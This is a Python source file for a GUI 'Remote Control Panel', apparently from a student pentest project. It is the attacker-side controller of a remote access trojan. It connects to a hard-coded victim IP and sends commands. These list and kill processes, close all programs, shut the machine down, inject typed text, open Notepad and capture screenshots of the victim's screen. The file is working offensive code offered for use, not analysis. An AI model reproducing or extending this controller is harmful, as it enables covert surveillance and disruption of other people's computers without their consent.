import customtkinter as ctk
import socket
import pyperclip
from tkinter import messagebox, filedialog, simpledialog
from PIL import Image
import os

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")

VICTIM_IP = "192.168.40.136"
PORT = 5000

client = None

def connect_to_victim():
    global client
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((VICTIM_IP, PORT))
        status_label.configure(text="🟢 Connected", fg_color="green")
    except Exception as e:
        messagebox.showerror("Connection Error", f"Could not connect: {e}")

def send_command(command):
    if not client:
        messagebox.showerror("Error", "Not connected to victim!")
        return ""

    try:
        client.send(command.encode())
        response = client.recv(4096).decode().strip()
        return response
    except Exception as e:
        messagebox.showerror("Error", f"Failed to send command: {e}")
        return ""

def list_apps():
    apps = send_command("list_apps")
    if not apps:
        messagebox.showinfo("List Apps", "No running applications found.")
        return

    # ترتيب النتائج أبجديًا
    sorted_apps = sorted(apps.split("\n"))

    # إنشاء نافذة جديدة
    list_window = ctk.CTkToplevel(app)
    list_window.title("Running Applications")
    list_window.geometry("400x500")
    list_window.iconbitmap("D:\\My Projects\\Pycharm\\Pentest_X\\img\\icon_home.ico")
    ctk.CTkLabel(list_window, text="Running Applications", font=("Arial", 16)).pack(pady=10)

    # إنشاء صندوق النصوص لعرض التطبيقات
    app_listbox = ctk.CTkTextbox(list_window, width=350, height=400)
    app_listbox.pack(pady=10)

    # إدراج التطبيقات داخل `Textbox` بعد الترتيب
    app_listbox.insert("1.0", "\n".join(sorted_apps))
    app_listbox.configure(state="disabled")  # جعل النص غير قابل للتعديل

    # دالة لنسخ النص المحدد
    def copy_selected_text():
        try:
            selected_text = app_listbox.get("sel.first", "sel.last").strip()
            if selected_text:
                pyperclip.copy(selected_text)
                messagebox.showinfo("Copied", f"Copied: {selected_text}")
        except:
            messagebox.showwarning("Warning", "No text selected to copy.")

    # زر النسخ
    ctk.CTkButton(list_window, text="Copy Selected", command=copy_selected_text).pack(pady=5)

def close_specific_app():
    def send_close_command():
        app_name = app_input.get().strip()
        if app_name:
            send_command(f"close_program {app_name}")
            close_window.destroy()
        else:
            messagebox.showerror("Error", "Please enter a valid app name!")

    close_window = ctk.CTkToplevel(app)
    close_window.title("Close Specific App")
    close_window.geometry("300x150")
    close_window.iconbitmap("D:\\My Projects\\Pycharm\\Pentest_X\\img\\icon_home.ico")
    ctk.CTkLabel(close_window, text="Enter App Name:", font=("Arial", 14)).pack(pady=10)
    app_input = ctk.CTkEntry(close_window, placeholder_text="example: notepad.exe")
    app_input.pack(pady=5)

    ctk.CTkButton(close_window, text="Close App", command=send_close_command).pack(pady=10)

def take_screenshot():
    if not client:
        messagebox.showerror("Error", "Not connected to victim!")
        return
    try:
        client.send("screenshot".encode())

        # Receive screenshot size
        size_data = client.recv(8)
        screenshot_size = int.from_bytes(size_data, "big")

        if screenshot_size == 0:
            messagebox.showerror("Error", "Failed to take screenshot.")
            return

        # Receive the screenshot data
        screenshot_data = b""
        while len(screenshot_data) < screenshot_size:
            chunk = client.recv(min(4096, screenshot_size - len(screenshot_data)))
            if not chunk:
                break
            screenshot_data += chunk

        # Define the folder and file path
        save_folder = r"D:\My Projects\Pycharm\Pentest_X\screenshot"
        os.makedirs(save_folder, exist_ok=True)  # Create folder if it doesn't exist
        screenshot_path = os.path.join(save_folder, "victim_screenshot.png")
        # Save the screenshot
        with open(screenshot_path, "wb") as f:
            f.write(screenshot_data)

        messagebox.showinfo("Screenshot Saved", f"Screenshot saved as {screenshot_path}")

    except Exception as e:
        messagebox.showerror("Error", f"Failed to take screenshot: {e}")

def live_typing():
    def on_text_change(event):
        text = text_box.get("1.0", "end-1c")
        if text.strip():
            send_command(f"type {text}")

    typing_window = ctk.CTkToplevel(app)
    typing_window.title("Live Typing")
    typing_window.geometry("400x300")
    typing_window.iconbitmap("D:\\My Projects\\Pycharm\\Pentest_X\\img\\icon_home.ico")
    ctk.CTkLabel(typing_window, text="Type your message:", font=("Arial", 14)).pack(pady=10)
    text_box = ctk.CTkTextbox(typing_window, width=350, height=200)
    text_box.pack(pady=5)

    # Send text on every key press
    text_box.bind("<KeyRelease>", on_text_change)

def disconnect_victim():
    global client

    if isinstance(client, socket.socket):
        try:
            send_command("disconnect")
            client.close()
            client = None
            status_label.configure(text="🔴 Disconnected", fg_color="red", font=("Arial", 14, "bold"), width=200)
            messagebox.showinfo("Disconnected", "Victim and Attacker have been disconnected.")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to disconnect: {e}")
    else:
        messagebox.showwarning("Warning", "No active connection to disconnect.")

app = ctk.CTk()
app.title("Remote Controller")
app.geometry("500x700")
app.configure(fg_color="black")
app.resizable(width=False, height=False)
app.iconbitmap("D:\\My Projects\\Pycharm\\Pentest_X\\img\\icon_home.ico")
ctk.CTkLabel(app, text="Remote Control Panel", font=("Arial", 20, "bold"), text_color="white").pack(pady=10)


merged_img = Image.new("RGBA", (240, 120))
merged_img.paste(Image.open("D:\\My Projects\\Pycharm\\Pentest_X\\img\\data1.png").resize((120, 120)), (0, 0))
merged_img.paste(Image.open("D:\\My Projects\\Pycharm\\Pentest_X\\img\\data2.png").resize((200, 200)), (100, 0))

final_image = ctk.CTkImage(merged_img, size=(240, 120))

bg_label = ctk.CTkLabel(app, image=final_image, text="")
bg_label.pack(pady=10)


status_label = ctk.CTkLabel(app, text="🔴 Disconnected", fg_color="red", font=("Arial", 14, "bold"), width=200)
status_label.pack(pady=5)

# Connect Button
ctk.CTkButton(app, text="Connect to Victim", command=connect_to_victim, fg_color="blue", width=400,height=40,hover_color="#070173",font=("Arial", 14, "bold")).pack(pady=10)

scroll_frame = ctk.CTkScrollableFrame(app, width=400, height=300,fg_color="#1a1a1a")
scroll_frame.pack(pady=10, padx=10, fill="both", expand=True)

# Command Buttons
commands = [
    ("List Running Apps", list_apps),  # Updated to open a window
    ("Destroy", lambda: send_command("close_all")),
    ("Shutdown", lambda: send_command("shutdown")),
    (" Type Text ", live_typing),
    ("Open Notepad", lambda: send_command("open notepad.exe")),
    ("Close App", close_specific_app),
    ("Take screenshot", take_screenshot),
    ("Disconnected", disconnect_victim),

]

for text, cmd in commands:
    if text == "Destroy" :
        ctk.CTkButton(scroll_frame, text=text, command=cmd,width=400,height=40,fg_color="#BF3F3F",hover_color="#54010d").pack(pady=10, padx=10)
    elif text == "Disconnected":
        ctk.CTkButton(scroll_frame, text=text, command=cmd, width=400, height=40, fg_color="#BF3F3F",hover_color="#54010d").pack(pady=10, padx=10)
    else:
        ctk.CTkButton(scroll_frame, text=text, command=cmd,width=400,height=40,fg_color="green",hover_color="#015409").pack(pady=10, padx=10)
ctk.CTkLabel(app, text="🔴 Red: Root Commands  |  🟢 Green: Normal User Commands", font=("Arial", 10), text_color="white").pack(pady=10)
app.mainloop()
